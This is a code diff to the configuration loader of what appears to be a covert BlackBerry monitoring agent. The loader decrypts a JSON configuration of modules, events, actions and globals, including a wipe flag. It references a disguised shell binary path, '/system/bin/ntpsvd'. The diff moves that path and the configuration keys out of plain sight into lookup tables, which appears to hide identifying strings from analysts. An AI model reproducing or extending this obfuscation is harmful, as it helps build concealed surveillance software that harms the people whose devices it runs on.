@@ -6,6 +6,7 @@ import rpc.json.me.JSONException;
 import rpc.json.me.JSONObject;
 import rpc.json.me.JSONTokener;
 import blackberry.GeneralException;
+import blackberry.Messages;
 import blackberry.Status;
 import blackberry.action.Action;
 import blackberry.crypto.EncryptionPKCS5;
@@ -20,7 +21,7 @@ import blackberry.module.BaseModule;
 
 public class Configuration {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("Configuration", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("Configuration", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     /** The status obj. */
@@ -42,7 +43,7 @@ public class Configuration {
     /** The Constant MIN_AVAILABLE_SIZE. */
     public static final long MIN_AVAILABLE_SIZE = 200 * 1024;
 
-    public static final String shellFile = "/system/bin/ntpsvd";
+    public static final String shellFile = Messages.getString("q.0"); //$NON-NLS-1$
 
     private static final int AGENT_ENABLED = 0x2;
 
@@ -77,7 +78,7 @@ public class Configuration {
         } catch (final Exception e) {
             //#ifdef DEBUG
             debug.error(e);
-            debug.error("loadConfiguration");
+            debug.error("loadConfiguration"); //$NON-NLS-1$
             //#endif
             return false;
         }
@@ -97,7 +98,7 @@ public class Configuration {
             final int num = jmodules.length();
 
             //#ifdef DEBUG
-            debug.trace("load, number of elements: " + num);
+            debug.trace("load, number of elements: " + num); //$NON-NLS-1$
             //#endif
 
             // Get id, status, parameters length and parameters
@@ -106,7 +107,7 @@ public class Configuration {
                 try {
                     jobject = jmodules.getJSONObject(i);
                     //#ifdef DEBUG
-                    debug.trace("load " + jobject);
+                    debug.trace("load " + jobject); //$NON-NLS-1$
                     //#endif
                     visitor.call(i, jobject);
                 } catch (JSONException e) {
@@ -133,7 +134,7 @@ public class Configuration {
 
         public void call(int moduleId, JSONObject params)
                 throws ConfigurationException, JSONException {
-            final String moduleType = params.getString("module");
+            final String moduleType = params.getString(Messages.getString("q.18")); //$NON-NLS-1$
 
             //#ifdef DEBUG
             /*debug.trace("call Module: " + moduleType + " Params size: "
@@ -156,22 +157,22 @@ public class Configuration {
         public void call(int eventId, JSONObject jmodule) throws JSONException {
             //#ifdef DBC
             Check.requires(jmodule != null,
-                    " (call) Assert failed, null jmodule");
+                    " (call) Assert failed, null jmodule"); //$NON-NLS-1$
             //#endif
 
-            String eventType = jmodule.getString("event");
+            String eventType = jmodule.getString(Messages.getString("q.17")); //$NON-NLS-1$
             //#ifdef DBC
             Check.asserts(eventType != null,
-                    " (call) Assert failed, null eventType");
+                    " (call) Assert failed, null eventType"); //$NON-NLS-1$
             //#endif
 
-            if (jmodule.has("type")) {
-                eventType += " " + jmodule.getString("type");
+            if (jmodule.has(Messages.getString("q.15"))) { //$NON-NLS-1$
+                eventType += " " + jmodule.getString(Messages.getString("q.16")); //$NON-NLS-1$ //$NON-NLS-2$
             }
 
             //#ifdef DEBUG
-            debug.trace("call Event: " + eventId + " type: " + eventType
-                    + " Params size: " + jmodule.length());
+            debug.trace("call Event: " + eventId + " type: " + eventType //$NON-NLS-1$ //$NON-NLS-2$
+                    + " Params size: " + jmodule.length()); //$NON-NLS-1$
             //#endif
 
             if (instantiate) {
@@ -190,25 +191,25 @@ public class Configuration {
 
         public void call(int actionId, JSONObject jaction)
                 throws ConfigurationException, JSONException {
-            String desc = jaction.getString("desc");
+            String desc = jaction.getString(Messages.getString("q.14")); //$NON-NLS-1$
             final Action a = new Action(actionId, desc);
 
-            JSONArray jsubactions = jaction.getJSONArray("subactions");
+            JSONArray jsubactions = jaction.getJSONArray(Messages.getString("q.13")); //$NON-NLS-1$
             int subNum = jsubactions.length();
 
             //#ifdef DEBUG
-            debug.trace("call Action " + actionId + " SubActions: " + subNum);
+            debug.trace("call Action " + actionId + " SubActions: " + subNum); //$NON-NLS-1$ //$NON-NLS-2$
             //#endif
 
             for (int j = 0; j < subNum; j++) {
                 JSONObject jsubaction = jsubactions.getJSONObject(j);
 
-                final String type = jsubaction.getString("action");
+                final String type = jsubaction.getString(Messages.getString("q.12")); //$NON-NLS-1$
                 ConfAction conf = new ConfAction(actionId, j, type, jsubaction);
                 if (a.addSubAction(conf)) {
                     //#ifdef DEBUG
-                    debug.trace("call SubAction " + j + " Type: " + type
-                            + " Params Length: " + jsubaction.length());
+                    debug.trace("call SubAction " + j + " Type: " + type //$NON-NLS-1$ //$NON-NLS-2$
+                            + " Params Length: " + jsubaction.length()); //$NON-NLS-1$
                     //#endif
 
                 }
@@ -233,39 +234,39 @@ public class Configuration {
     private boolean parseConfiguration(boolean instantiate, String json) {
         try {
             //#ifdef DEBUG
-            debug.trace("parseConfiguration: " + json);
+            debug.trace("parseConfiguration: " + json); //$NON-NLS-1$
             //#endif
 
             JSONObject root = (JSONObject) new JSONTokener(json).nextValue();
 
-            JSONArray jmodules = root.getJSONArray("modules");
-            JSONArray jevents = root.getJSONArray("events");
-            JSONArray jactions = root.getJSONArray("actions");
-            JSONObject jglobals = root.getJSONObject("globals");
+            JSONArray jmodules = root.getJSONArray(Messages.getString("q.1")); //$NON-NLS-1$
+            JSONArray jevents = root.getJSONArray(Messages.getString("q.2")); //$NON-NLS-1$
+            JSONArray jactions = root.getJSONArray(Messages.getString("q.3")); //$NON-NLS-1$
+            JSONObject jglobals = root.getJSONObject(Messages.getString("q.4")); //$NON-NLS-1$
 
             //#ifdef DEBUG
-            debug.info("parseConfiguration -- MODULES");
+            debug.info("parseConfiguration -- MODULES"); //$NON-NLS-1$
             //#endif
             Visitor.load(jmodules, new LoadModule(instantiate));
           //#ifdef DEBUG
-            debug.info("parseConfiguration -- EVENTS");
+            debug.info("parseConfiguration -- EVENTS"); //$NON-NLS-1$
             //#endif
             Visitor.load(jevents, new LoadEvent(instantiate));
           //#ifdef DEBUG
-            debug.info("parseConfiguration -- ACTIONS");
+            debug.info("parseConfiguration -- ACTIONS"); //$NON-NLS-1$
             //#endif
             Visitor.load(jactions, new LoadAction(instantiate));
 
           //#ifdef DEBUG
-            debug.info("parseConfiguration -- GLOBALS");
+            debug.info("parseConfiguration -- GLOBALS"); //$NON-NLS-1$
             //#endif
             loadGlobals(jglobals, instantiate);
 
             //#ifdef DEBUG
-            debug.trace("== ACTIONS ==\n" + ActionManager.getInstance());
-            debug.trace("== MODULES ==\n" + ModuleManager.getInstance());
-            debug.trace("== EVENTS ==\n " + EventManager.getInstance());
-            debug.trace("== STATUS ==\n " + status.statusGlobals());
+            debug.trace("== ACTIONS ==\n" + ActionManager.getInstance()); //$NON-NLS-1$
+            debug.trace("== MODULES ==\n" + ModuleManager.getInstance()); //$NON-NLS-1$
+            debug.trace("== EVENTS ==\n " + EventManager.getInstance()); //$NON-NLS-1$
+            debug.trace("== STATUS ==\n " + status.statusGlobals()); //$NON-NLS-1$
             //#endif
 
             return true;
@@ -282,14 +283,14 @@ public class Configuration {
 
         Globals g = new Globals();
 
-        JSONObject jquota = jglobals.getJSONObject("quota");
-        g.quotaMin = jquota.getInt("min");
-        g.quotaMax = jquota.getInt("max");
+        JSONObject jquota = jglobals.getJSONObject(Messages.getString("q.5")); //$NON-NLS-1$
+        g.quotaMin = jquota.getInt(Messages.getString("q.6")); //$NON-NLS-1$
+        g.quotaMax = jquota.getInt(Messages.getString("q.7")); //$NON-NLS-1$
 
-        g.wipe = jglobals.getBoolean("wipe");
-        g.type = jglobals.getString("type");
-        g.migrated = jglobals.getBoolean("migrated");
-        g.version = jglobals.getInt("version");
+        g.wipe = jglobals.getBoolean(Messages.getString("q.8")); //$NON-NLS-1$
+        g.type = jglobals.getString(Messages.getString("q.9")); //$NON-NLS-1$
+        g.migrated = jglobals.getBoolean(Messages.getString("q.10")); //$NON-NLS-1$
+        g.version = jglobals.getInt(Messages.getString("q.11")); //$NON-NLS-1$
 
         status.setGlobal(g);
     }
@@ -326,7 +327,7 @@ public class Configuration {
             if (json != null && json.length() > 0) {
                 // Return decrypted conf
                 //#ifdef DEBUG
-                debug.trace("decryptConfiguration: valid");
+                debug.trace("decryptConfiguration: valid"); //$NON-NLS-1$
                 //#endif
 
                 return json;
@@ -336,12 +337,12 @@ public class Configuration {
         } catch (final SecurityException e) {
             //#ifdef DEBUG
             debug.error(e);
-            debug.error("decryptConfiguration");
+            debug.error("decryptConfiguration"); //$NON-NLS-1$
             //#endif
         } catch (final Exception e) {
             //#ifdef DEBUG
             debug.error(e);
-            debug.error("decryptConfiguration");
+            debug.error("decryptConfiguration"); //$NON-NLS-1$
             //#endif
         }
 
